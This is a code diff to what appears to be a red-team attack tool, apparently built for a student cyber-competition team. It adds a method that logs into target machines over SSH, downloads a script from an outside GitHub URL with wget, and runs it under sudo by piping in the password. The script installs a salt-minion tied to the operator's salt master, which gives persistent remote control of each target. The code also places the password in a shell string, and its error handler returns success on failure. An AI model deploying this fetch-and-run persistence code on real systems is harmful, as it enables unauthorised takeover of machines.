@@ -86,6 +86,7 @@ class TargetMachine:
 			ssh_client = paramiko.SSHClient()
 			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 			ssh_client.connect(self.ip_address, username=username, look_for_keys=True, timeout=3) # only use SSH keys because the attacker may have changed their password
+			ssh_client.close()
 			# logger.debug(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - Successfully logged in as `{username}`.{BetterLogger.COLOR_END}")
 
 			logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Hellevator previously ran on the target machine and you have SSH access!{BetterLogger.COLOR_END}")
@@ -106,3 +107,49 @@ class TargetMachine:
 			if exploit_is_vulnerable:
 				num_vulnerabilities += 1
 		return num_vulnerabilities
+
+	def install_salt_minion(self):
+		"""
+		Installs salt-minion on the target machine
+		"""
+		try:
+			logger.info(f"{self.ip_address} - Installing salt-minion on the target machine...")
+
+			username = self.parsed_config["ssh_username"]
+			password = self.parsed_config["ssh_password"]
+			salt_master_ip = self.parsed_config["salt_master_ip"]
+
+			# logger.debug(f"{self.ip_address} - Logging in as `{username}` over SSH...")
+			ssh_client = paramiko.SSHClient()
+			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+			ssh_client.connect(self.ip_address, username=username, look_for_keys=True, timeout=3) # only use SSH keys because the attacker may have changed their password
+			# logger.debug(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - Successfully logged in as `{username}`.{BetterLogger.COLOR_END}")
+
+			# download our salt install script
+			salt_download_command = "wget -O salt_install.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/scripts/salt_install.sh && chmod +x salt_install.sh"
+			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(command=salt_download_command)
+			return_code = ssh_stdout.channel.recv_exit_status()
+			if return_code != 0:
+				ssh_stdout_text = ssh_stdout.read().decode().strip()
+				ssh_stderr_text = ssh_stderr.read().decode().strip()
+				logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Failed to download the salt install script!{BetterLogger.COLOR_END}")
+				logger.exception(f"Script output:\nReturn code: {return_code}\nstd_out: `{ssh_stdout_text}`\nstd_err:`{ssh_stderr_text}`")
+				return False
+
+			# run the salt install script as sudo, which requires piping our password in
+			salt_install_command = f"DEBIAN_FRONTEND=noninteractive; echo '{password}' | sudo -S ./salt_install.sh -i {salt_master_ip}"
+			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(command=salt_install_command)
+			return_code = ssh_stdout.channel.recv_exit_status()
+			if return_code != 0:
+				ssh_stdout_text = ssh_stdout.read().decode().strip()
+				ssh_stderr_text = ssh_stderr.read().decode().strip()
+				logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Failed to install salt-minion!{BetterLogger.COLOR_END}")
+				logger.exception(f"Script output:\nReturn code: {return_code}\nstd_out: `{ssh_stdout_text}`\nstd_err:`{ssh_stderr_text}`")
+				return False
+
+			logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - The salt-minion was successfully installed!{BetterLogger.COLOR_END}")
+			return True
+		except Exception as err:
+			logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Something went wrong while installing the salt-minion!{BetterLogger.COLOR_END}")
+			logger.exception(err)
+			return True
